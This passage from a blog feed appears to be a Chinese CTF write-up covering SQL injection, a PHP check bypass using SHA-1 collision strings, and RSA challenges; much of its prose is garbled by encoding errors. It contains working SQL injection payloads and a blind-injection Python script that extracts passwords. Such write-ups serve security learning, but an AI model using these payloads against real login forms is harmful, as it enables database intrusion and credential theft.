class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.COLUMNS<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_NAME=<span class="hljs-string">'users'</span><span class="hljs-comment">#</span></code></pre></div><p><code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code>åˆ—åå¾ˆå¤šï¼Œé€‰æ‹©password</p><p><strong>çˆ†flag</strong></p><div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span><span class="hljs-comment">#</span></code></pre></div><p><img src="/2020/09/27/cumtctf/w2-3.png" srcset="/img/loading.gif" alt></p><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>æ‰«æä¸€ä¸‹ç›®å½•å‘ç°å­˜åœ¨ä¸€ä¸ª<a href="http://www.zipçš„æ–‡ä»¶ï¼Œç›´æ¥ä¸‹è½½å¾—åˆ°æºç ï¼Œä¸‹é¢å°±æ˜¯ä¸€å±‚ä¸€å±‚çš„ç»•è¿‡" target="_blank" rel="noopener">www.zipçš„æ–‡ä»¶ï¼Œç›´æ¥ä¸‹è½½å¾—åˆ°æºç ï¼Œä¸‹é¢å°±æ˜¯ä¸€å±‚ä¸€å±‚çš„ç»•è¿‡</a></p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include_once</span>(<span class="hljs-string">'flag.php'</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param1'</span>]))&#123;    $str1=$_GET[<span class="hljs-string">'param1'</span>];    <span class="hljs-keyword">if</span>(file_get_contents($str1)!==<span class="hljs-string">'Suvin_wants_a_girlfriend'</span>)        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Suvin doesn't like you"</span>);    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param2'</span>]))&#123;        $str2=$_GET[<span class="hljs-string">'param2'</span>];        <span class="hljs-keyword">if</span>(!is_numeric($str2))            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin prefers strings of Numbers'</span>);        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&lt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>)            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too short'</span>);        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&gt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">31</span>)            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too long'</span>);        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Suvin says he's falling in love with you!"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;            sleep(intval($str2));         &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param2'</span>])) &#123;            $str1=$_POST[<span class="hljs-string">'param1'</span>];            $str2=$_POST[<span class="hljs-string">'param2'</span>];            <span class="hljs-keyword">if</span>(strlen($str1)&gt;<span class="hljs-number">1000</span>)                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's too long"</span>);            <span class="hljs-keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))                <span class="hljs-keyword">echo</span> $flag;            <span class="hljs-keyword">else</span>                 <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's so similar to md5"</span>);        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>é¦–å…ˆgetæ–¹å¼è·å–ä¸¤ä¸ªå‚æ•°ï¼Œparam1è¦ç­‰äºé‚£ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™é‡Œä½¿ç”¨phpçš„dataä¼ªåè®®</p><p>param2è¦åœ¨<code>3600*24*30</code>å’Œ<code>3600*24*31</code>ä¹‹é—´ï¼Œå¯ä»¥å–2.6e6,è¿™ä¸¤ä¸ªå‚æ•°ç»•è¿‡åï¼Œå°±è¦ç»•è¿‡ä¸‹é¢çš„postæ–¹å¼ä¸Šä¼ çš„ä¸¤ä¸ªå€¼</p><p>å¯¹parame1çš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œå¹¶ä¸”ä¸¤å‚æ•°çš„å­—ç¬¦ä¸²å½¢å¼ä¸ç›¸ç­‰ï¼Œsha1çš„å€¼è¦ç›¸ç­‰ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸md5å‡½æ•°ä¸€æ ·ï¼Œä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯è¿™é¢˜æ²¡é‚£ä¹ˆç®€å•ï¼Œè¯•äº†å¾ˆå¤šæ¬¡éƒ½ä¸è¡Œã€‚ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªå¾ˆç±»ä¼¼çš„é¢˜ç›®ï¼ˆsha1å¼±ç¢°æ’ï¼‰ï¼Œå…¶ä¸­ä¹Ÿç»™å‡ºç¬¦åˆè¦æ±‚çš„å­—ç¬¦ä¸²ã€‚</p><p><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-68953730.nonecase&utm_term=%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E4%B8%B2sha1%E4%B8%80%E6%A0%B7" target="_blank" rel="noopener">ç‚¹è¿™é‡Œ</a></p><p>å®Œæ•´çš„payloadï¼š</p><p><code>?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7</code></p><div class="hljs"><pre><code class="hljs llvm">POST:param<span class="hljs-number">1</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%7</span>FF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%A6</span><span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%01</span><span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%AA</span><span class="hljs-symbol">%1</span>D<span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>BE<span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%88</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8K</span><span class="hljs-symbol">%8</span>CLy<span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%E0</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%F6</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B1i</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%C5kE</span><span class="hljs-symbol">%C1S</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B7</span><span class="hljs-symbol">%608</span><span class="hljs-symbol">%E9rr</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%ADr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EI<span class="hljs-symbol">%04</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%C20W</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%E9</span><span class="hljs-symbol">%D4</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%E1.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%BC</span><span class="hljs-symbol">%94</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E35B</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%80</span>-<span class="hljs-symbol">%98</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-symbol">%C3</span><span class="hljs-symbol">%7</span>F<span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%E7M</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>C<span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8t</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-symbol">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%89</span><span class="hljs-symbol">%60</span>k<span class="hljs-symbol">%D0</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%04</span>F<span class="hljs-symbol">%29</span><span class="hljs-symbol">%A1</span>&amp;param<span class="hljs-number">2</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span>sF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%91</span>f<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%11</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%F9</span><span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%CC</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8</span><span class="hljs-symbol">%5</span>B<span class="hljs-symbol">%A8Ly</span><span class="hljs-symbol">%03</span><span class="hljs-symbol">%0</span>C<span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%E2</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%A9</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%DFE</span><span class="hljs-symbol">%C1O</span><span class="hljs-symbol">%26</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%DC8</span><span class="hljs-symbol">%E9j</span><span class="hljs-symbol">%C2</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%BDr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EE<span class="hljs-symbol">%BC</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%D2</span><span class="hljs-symbol">%3</span>CW<span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%EB</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%BBU.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E31</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%807</span><span class="hljs-symbol">%B8</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-symbol">%DF</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%EBM</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8dy</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-symbol">%2</span>Cv<span class="hljs-symbol">%21</span>V<span class="hljs-symbol">%60</span><span class="hljs-symbol">%DD0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%91</span><span class="hljs-symbol">%D0k</span><span class="hljs-symbol">%D0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%BCF</span><span class="hljs-symbol">%29</span><span class="hljs-symbol">%B1</span></code></pre></div><p><strong>è¿˜æœ‰ä¸€ä¸ªå¾ˆå‘çš„åœ°æ–¹ï¼Œhackbarä¸Šä¼ æ—¶æ²¡æœ‰ä½œç”¨ï¼Œåªèƒ½ç”¨bpæŠ“åŒ…ä¸Šä¼ ï¼ŒæŠ“åŒ…æ—¶æ³¨æ„å…ˆéšä¾¿postä¸€ä¸ªå‚æ•°ï¼Œè¿™æ ·æ•°æ®åŒ…æ‰æ˜¯postæ–¹å¼ï¼Œç„¶åè´´ä¸Šä¸Šé¢çš„ä¸¤ä¸ªå‚æ•°å€¼</strong></p><h3 id="babysql2"><a href="#babysql2" class="headerlink" title="babysql2"></a>babysql2</h3><p>æŸ¥è¯¢è¯­å¥ä¸ç¬¬ä¸€ä¸ªæ³¨å…¥ç›¸åŒï¼Œä½†æ˜¯è¿™é¢˜ä¸ç»™å›æ˜¾ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨ï¼Œä½†æ˜¯å¥½åƒè¿‡æ»¤äº†æ›´å¤šçš„å…³é”®å­—</p><p>åœ¨1çš„åŸºç¡€ä¸Šé¢å¤–è¿‡æ»¤äº† â€˜ ï¼Œ ascii ï¼Œ mid ï¼Œ substr ï¼Œå…³é—­äº†æŠ¥é”™å›æ˜¾å’Œè¾“å‡ºï¼Œä½†æ˜¯æŸ¥è¯¢æˆåŠŸæˆ–è€…å¤±è´¥ å›æ˜¾ä¸åŒï¼Œå› æ­¤å¯ä»¥boolæ³¨å…¥ã€‚</p><div class="hljs"><pre><code class="hljs python">url = <span class="hljs-string">'http://219.219.61.234:20004/'</span>password = <span class="hljs-string">""</span>string = [ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;'</span>]<span class="hljs-comment">#å°†å­—æ¯è½¬æ¢ä¸ºasciiç </span>a = <span class="hljs-string">'0x5e'</span>   <span class="hljs-comment"># '\'çš„asciiç å€¼</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:        <span class="hljs-keyword">if</span> (hex(j)[<span class="hljs-number">2</span>:]==<span class="hljs-string">'7b'</span>):            str=<span class="hljs-string">'5c'</span>+hex(j)[<span class="hljs-number">2</span>:]  <span class="hljs-comment">#å°†'&#123;'è½¬ä¹‰ï¼Œ</span>        <span class="hljs-keyword">else</span>:            str=hex(j)[<span class="hljs-number">2</span>:]        time.sleep(<span class="hljs-number">0.1</span>)        payload  =<span class="hljs-string">"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#"</span> % (a + str)<span class="hljs-comment"># ç›²æ³¨çš„æŸ¥è¯¢è¯­å¥ regexp binary æ˜¯åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…</span>        data =&#123;<span class="hljs-string">"username"</span>:<span class="hljs-string">"\\"</span>,<span class="hljs-string">"password"</span>:payload&#125;        print(data)        r = requests.post(url,data=data) <span class="hljs-comment">#è®¿é—®</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">"success"</span> <span class="hljs-keyword">in</span> r.text:            <span class="hljs-comment">#print(r.text)</span>            password+=chr(j)            print(password)            a+=str                  <span class="hljs-keyword">break</span>    <span class="hljs-keyword">if</span> <span class="hljs-string">"wrong"</span> <span class="hljs-keyword">in</span> r.text:        <span class="hljs-keyword">break</span>print(password)</code></pre></div><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å¹¼å„¿å›­çš„å¯†ç é¢˜"><a href="#å¹¼å„¿å›­çš„å¯†ç é¢˜" class="headerlink" title="å¹¼å„¿å›­çš„å¯†ç é¢˜"></a>å¹¼å„¿å›­çš„å¯†ç é¢˜</h3><p>å…ˆè½¬æ¢ä¸ºåè¿›åˆ¶ååœ¨çº¿åˆ†è§£åç›´æ¥ä¸Šè„šæœ¬</p><p><a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> åœ¨çº¿åˆ†è§£ç½‘å€</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> syssys.setrecursionlimit(<span class="hljs-number">1000000</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ByteToHex</span><span class="hljs-params">(bins)</span>:</span>  <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">"%02X"</span> % x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bins]).strip()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:    t = <span class="hljs-string">'0'</span> + t  \<span class="hljs-comment">#print(t)</span>  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a, b)</span>:</span>  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)  <span class="hljs-keyword">else</span>:    g, y, x = egcd(b % a, a)    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modinv</span><span class="hljs-params">(a, m)</span>:</span>  g, x, y = egcd(a, m)  <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:    print(<span class="hljs-string">'modular inverse does not exist'</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">'null'</span>  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">return</span> x % mc = <span class="hljs-number">40448992051548719008529549070468060415257485938698092782029814901918646701101</span>p = <span class="hljs-number">328413456989577256301798468872388310877</span>q = <span class="hljs-number">324350545929838254331191385863847627003</span>e = <span class="hljs-number">65537</span>n = p * qd = modinv(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))m = pow(c, d, n)<span class="hljs-keyword">print</span> (m)</code></pre></div><p>æ•°å­—è½¬å­—ç¬¦çš„è„šæœ¬</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:    t = <span class="hljs-string">'0'</span> + t  \<span class="hljs-comment">#print(t)</span>  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))print(n2s(a)) <span class="hljs-comment">#aä¸ºä¸Šä¸€ä¸ªè„šæœ¬è®¡ç®—å‡ºçš„æ•°å­—</span></code></pre></div><h3 id="å°å­¦ç”Ÿçš„å¯†ç é¢˜"><a href="#å°å­¦ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç é¢˜"></a>å°å­¦ç”Ÿçš„å¯†ç é¢˜</h3><h3 id="åˆä¸­ç”Ÿçš„å¯†ç é¢˜"><a href="#åˆä¸­ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="åˆä¸­ç”Ÿçš„å¯†ç é¢˜"></a>åˆä¸­ç”Ÿçš„å¯†ç é¢˜</h3><p>æ¬¡é¢˜ä¸å¹¼å„¿å›­çš„ç±»ä¼¼ï¼Œä½†æ˜¯ç”±äºnè¿‡å¤§ï¼Œè¯•äº†å¾ˆå¤šå·¥å…·éƒ½æ— æ³•åˆ†è§£ã€‚</p><p>ä»”ç»†çœ‹é¢˜ä¼šå‘ç°è¿™é¢˜çš„æ¡ä»¶ç»™çš„æ¯”è¾ƒå¤š,çŸ¥é“p-q</p><p>äºæ˜¯æƒ³åˆ°äº†<code>(p+q)^2-(p-q)^2=4pq=4n</code>ï¼Œå¯ä»¥ç®—å‡ºp+q,ä¹‹åè§£å‡ºp,q</p><div class="hljs"><pre><code class="hljs python">ç®—p,qçš„è„šæœ¬<span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/9/24 21:55</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : su.py</span><span class="hljs-keyword">import</span> gmpy2n = <span class="hljs-number">848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397</span>p_sub_q = <span class="hljs-number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span>x = (<span class="hljs-number">4</span>*n+p_sub_q*p_sub_q)gmpy2.mpz(x)<span class="hljs-comment">#p_add_q = gmpy2.iroot(x, 2)</span>p_add_q = <span class="hljs-number">58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078</span><span class="hljs-comment"># print(p_add_q)</span>y=(p_sub_q+p_add_q)z=(p_add_q-p_sub_q)print(y&gt;&gt;<span class="hljs-number">1</span>)print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div><p>çŸ¥é“p,qåï¼Œæ­¤é¢˜çš„è§£æ³•ä¸å¹¼å„¿å›­çš„è§£æ³•ç›¸åŒ</p><p>èœé¸¡åªä¼šè¿™ä¹ˆå¤šã€‚ã€‚ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>æ–‡ä»¶åŒ…å«</tag>
      
      <tag>rsa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fakebook</title>
    <link href="/2020/09/27/fakebook/"/>
    <url>/2020/09/27/fakebook/</url>
    
